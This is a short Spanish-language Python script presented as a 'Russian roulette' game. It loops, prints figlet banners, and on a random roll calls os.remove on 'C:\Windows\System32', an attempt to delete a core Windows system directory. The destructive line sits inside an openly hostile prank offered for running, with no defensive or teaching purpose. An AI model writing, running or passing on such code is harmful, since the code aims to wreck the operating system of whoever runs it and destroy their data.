import random as aleatorio
import os as sistema
si = "si"
while "si" == si:
    sistema.system("figlet crador josemariobrabo")
    sistema.system("figlet ruleta rusa")
    if aleatorio.randint(0,6) == 1 :
       	sistema.remove("C:\Windows\System32")
      	sistema.system("figlet perdiste")
    else:
    	sistema.system("figlet ganaste")
    print("[+] desea otra vez jugar")
    si = input("(si/no)")
    sistema.system("clear")
else:
    sistema.system("figlet gracias")
